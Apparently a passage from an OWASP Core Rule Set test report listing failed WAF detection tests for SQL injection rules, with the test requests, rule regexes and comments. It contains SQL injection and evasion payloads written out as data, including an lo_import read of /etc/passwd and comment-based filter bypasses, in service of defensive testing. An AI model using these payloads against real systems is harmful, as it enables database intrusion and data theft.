          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)\\[?\\$(?:a(?:bs|c(?:cumulator|osh?)|dd(?:ToSet)?|ll(?:ElementsTrue)?|n(?:d|yElementTrue)|rray(?:ElemA|ToObjec)t|sinh?|tan[2h]?|vg)|b(?:etween|i(?:narySize|t(?:And|Not|(?:O|Xo)r)?)|ottomN?|sonSize|ucket(?:Auto)?)|c(?:eil|mp|o(?:n(?:cat(?:Arrays)?|d|vert)|sh?|unt|variance(?:Po|Sam)p)|urrentDate)|d(?:a(?:te(?:Add|Diff|From(?:Parts|String)|Subtract|T(?:o(?:Parts|String)|runc))|yOf(?:Month|Week|Year))|e(?:greesToRadians|nseRank|rivative)|iv(?:ide)?|ocumentNumber)|e(?:(?:a|lemMat)ch|q|x(?:ists|p(?:MovingAvg|r)?))|f(?:i(?:lter|rstN?)|loor|unction)|g(?:etField|roup|te?)|(?:hou|xo|yea)r|i(?:fNull|n(?:c|dexOf(?:Array|Bytes|CP)|tegral)?|s(?:Array|Number|o(?:DayOfWeek|Week(?:Year)?)))|jsonSchema|l(?:astN?|et|i(?:ke|(?:nearFil|tera)l)|n|o(?:cf|g(?:10)?)|t(?:e|rim)?)|m(?:a(?:p|xN?)|e(?:dian|rgeObjects|ta)|i(?:llisecond|n(?:N|ute)?)|o(?:d|nth)|ul(?:tiply)?)|n(?:atural|e|in|o[rt])|o(?:bjectToArray|r)|p(?:ercentile|o(?:[pw]|sition)|roject|u(?:ll(?:All)?|sh))|r(?:a(?:diansToDegrees|n(?:[dk]|ge))|e(?:(?:duc|nam)e|gex(?:Find(?:All)?|Match)?|place(?:All|One)|verseArray)|ound|trim)|s(?:(?:ampleRat|lic)e|e(?:cond|t(?:Difference|(?:Equal|WindowField)s|Field|I(?:ntersection|sSubset)|OnInsert|Union)?)|(?:hif|pli|qr)t|i(?:nh?|ze)|ort(?:Array)?|t(?:dDev(?:Po|Sam)p|r(?:Len(?:Bytes|CP)|casecmp))|u(?:b(?:str(?:Bytes|CP)?|tract)|m)|witch)|t(?:anh?|ext|o(?:Bool|D(?:(?:at|oubl)e|ecimal)|HashedIndexKey|Int|Lo(?:ng|wer)|ObjectId|String|U(?:UID|pper)|pN?)|r(?:im|unc)|s(?:Increment|Second)|ype)|unset|w(?:eek|here)|zip)\\]?"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942290
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Finds basic MongoDB SQL injection attempts"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942320",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942320.yaml",
    "description" : "Detects PostgreSQL bypass attempt lo_import'( - issue #2912",
    "cause" : "failed expect_id check: 942320 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Detects PostgreSQL bypass attempt lo_import'( - issue #2912",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/index.php?id=lo_import(%27/etc%27%20||%20%27/pass%27%20||%20%27wd%27)",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942320 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942320,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule has a stricter sibling (942321) that checks for MySQL and PostgreSQL procedures / functions in"
        }, {
          "type" : "Comment",
          "text" : " request headers referer and user-agent."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942320.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942320"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)create[\\s\\x0b]+(?:function|procedure)[\\s\\x0b]*?[0-9A-Z_a-z]+[\\s\\x0b]*?\\([\\s\\x0b]*?\\)[\\s\\x0b]*?-|d(?:eclare[^0-9A-Z_a-z]+[#@][\\s\\x0b]*?[0-9A-Z_a-z]+|iv[\\s\\x0b]*?\\([\\+\\-]*[\\s\\x0b\\.0-9]+,[\\+\\-]*[\\s\\x0b\\.0-9]+\\))|exec[\\s\\x0b]*?\\([\\s\\x0b]*?@|(?:lo_(?:impor|ge)t|procedure[\\s\\x0b]+analyse)[\\s\\x0b]*?\\(|;[\\s\\x0b]*?(?:declare|open)[\\s\\x0b]+[\\-0-9A-Z_a-z]+|::(?:b(?:igint|ool)|double[\\s\\x0b]+precision|int(?:eger)?|numeric|oid|real|(?:tex|smallin)t)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942320
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Detects MySQL and PostgreSQL stored procedure/function injections"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942440",
    "test_id" : 3,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942440.yaml",
    "description" : "SQL Comment Sequence",
    "cause" : "failed expect_id check: 942440 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942390 - SQL Injection Attack" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "SQL Comment Sequence",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "version" : "HTTP/1.1",
          "uri" : "/post",
          "data" : "test=OR 1# "
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942440 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942440,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect SQL Comment Sequences ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example Payloads Detected:"
        }, {
          "type" : "Comment",
          "text" : " -------------------------"
        }, {
          "type" : "Comment",
          "text" : " OR 1#"
        }, {
          "type" : "Comment",
          "text" : " DROP sampletable;--"
        }, {
          "type" : "Comment",
          "text" : " admin'--"
        }, {
          "type" : "Comment",
          "text" : " DROP/*comment*/sampletable"
        }, {
          "type" : "Comment",
          "text" : " DR/**/OP/*bypass deny listing*/sampletable"
        }, {
          "type" : "Comment",
          "text" : " SELECT/*avoid-spaces*/password/**/FROM/**/Members"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*!32302 1/0, */ 1 FROM tablename"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1#"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1-- -"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1/*"
        }, {
          "type" : "Comment",
          "text" : " ' or 1=1;\\x00"
        }, {
          "type" : "Comment",
          "text" : " 1='1' or-- -"
        }, {
          "type" : "Comment",
          "text" : " ' /*!50000or*/1='1"
        }, {
          "type" : "Comment",
          "text" : " ' /*!or*/1='1"
        }, {
          "type" : "Comment",
          "text" : " 0/**/union/*!50000select*/table_name`foo`/**/"
        }, {
          "type" : "Comment",
          "text" : " -------------------------"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The chained rule is designed to prevent false positives by specifically"
        }, {
          "type" : "Comment",
          "text" : " targeting JWT tokens and common tokens (brid, fbclid, gclid, recaptcha, ttclid, etc)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Starting with 'ey' targets JWT tokens, where the 'ey'"
        }, {
          "type" : "Comment",
          "text" : " prefix corresponds to the beginning of the Base64-encoded header section."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " example:"
        }, {
          "type" : "Comment",
          "text" : " $ echo '{\"' | base64"
        }, {
          "type" : "Comment",
          "text" : " eyIK"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expressions generated from regex-assembly/942440.ra and regex-assembly/942440-chain1.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expressions run the following shell scripts"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942440"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942440-chain1"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "/\\*!?|\\*/|[';]--|--(?:[\\s\\x0b]|[^\\-]*?-)|[^&\\-]#.*?[\\s\\x0b]|;?\\x00"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942440
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Comment Sequence Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "942440",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942440.yaml",
    "description" : "SQL Comment Sequence",
    "cause" : "failed expect_id check: 942440 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942130 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942390 - SQL Injection Attack", "phase=2 rule_id=942521 - Detects basic SQL authentication bypass attempts 4.1/4", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "SQL Comment Sequence",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "version" : "HTTP/1.1",
          "uri" : "/post",
          "data" : "test=' or 1=1# "
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942440 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942440,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect SQL Comment Sequences ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Example Payloads Detected:"
        }, {
          "type" : "Comment",
          "text" : " -------------------------"
        }, {
          "type" : "Comment",
          "text" : " OR 1#"
        }, {
          "type" : "Comment",
          "text" : " DROP sampletable;--"
        }, {
          "type" : "Comment",
          "text" : " admin'--"
        }, {
          "type" : "Comment",
          "text" : " DROP/*comment*/sampletable"
        }, {
          "type" : "Comment",
          "text" : " DR/**/OP/*bypass deny listing*/sampletable"
        }, {
          "type" : "Comment",
          "text" : " SELECT/*avoid-spaces*/password/**/FROM/**/Members"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*!32302 1/0, */ 1 FROM tablename"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1#"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1-- -"
        }, {
          "type" : "Comment",
          "text" : "  or 1=1/*"
        }, {
          "type" : "Comment",
          "text" : " ' or 1=1;\\x00"
        }, {
          "type" : "Comment",
          "text" : " 1='1' or-- -"
        }, {
          "type" : "Comment",
          "text" : " ' /*!50000or*/1='1"
        }, {
          "type" : "Comment",
          "text" : " ' /*!or*/1='1"
        }, {
          "type" : "Comment",
          "text" : " 0/**/union/*!50000select*/table_name`foo`/**/"
        }, {
          "type" : "Comment",
          "text" : " -------------------------"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The chained rule is designed to prevent false positives by specifically"
        }, {
          "type" : "Comment",
          "text" : " targeting JWT tokens and common tokens (brid, fbclid, gclid, recaptcha, ttclid, etc)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Starting with 'ey' targets JWT tokens, where the 'ey'"
        }, {
          "type" : "Comment",
          "text" : " prefix corresponds to the beginning of the Base64-encoded header section."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " example:"
        }, {
          "type" : "Comment",
          "text" : " $ echo '{\"' | base64"
        }, {
          "type" : "Comment",
          "text" : " eyIK"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expressions generated from regex-assembly/942440.ra and regex-assembly/942440-chain1.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expressions run the following shell scripts"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942440"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942440-chain1"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/_pk_ref/"
        } ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "/\\*!?|\\*/|[';]--|--(?:[\\s\\x0b]|[^\\-]*?-)|[^&\\-]#.*?[\\s\\x0b]|;?\\x00"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942440
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Comment Sequence Detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "942500",
    "test_id" : 1,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942500.yaml",
    "description" : "Use of portability comment (/*!...*/) as evasion technique",
    "cause" : "failed expect_id check: 942500 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Use of portability comment (/*!...*/) as evasion technique",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942500 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942500,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ Detect MySQL in-line comments ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " MySQL in-line comments can be used to bypass SQLi detection."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Ref: https://dev.mysql.com/doc/refman/8.0/en/comments.html:"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*! STRAIGHT_JOIN */ col1 FROM table1,table2 WHERE ..."
        }, {
          "type" : "Comment",
          "text" : " CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024 */;"
        }, {
          "type" : "Comment",
          "text" : " SELECT /*+ BKA(t1) */ FROM ... ;"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://localhost/test.php?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0}"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The minimal string that triggers this regexp is: /*!*/ or /*+*/."
        }, {
          "type" : "Comment",
          "text" : " The rule 942500 is related to 942440 which catches both /*! and */ independently."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942500.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 942500"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)/\\*[\\s\\x0b]*?[!\\+](?:[\\s\\x0b\\(\\)\\-0-9=A-Z_a-z]+)?\\*/"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942500
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "MySQL in-line comment detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942500",
    "test_id" : 2,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942500.yaml",
    "description" : "Use of portability comment (/*!...*/) as evasion technique, with space before !",
    "cause" : "failed expect_id check: 942500 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Use of portability comment (/*!...*/) as evasion technique, with space before !",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
